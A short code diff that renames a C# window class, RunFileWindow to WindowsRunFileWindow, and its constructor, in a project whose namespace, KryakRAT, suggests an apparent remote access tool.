@@ -10,12 +10,12 @@ using WinRT.Interop;
 
 namespace KryakRAT.Windows;
 
-public sealed partial class RunFileWindow : Window
+public sealed partial class WindowsRunFileWindow : Window
 {
     private readonly UserData _user;
     private string? _selectedPath;
 
-    public RunFileWindow(UserData user)
+    public WindowsRunFileWindow(UserData user)
     {
         InitializeComponent();
         _user = user;
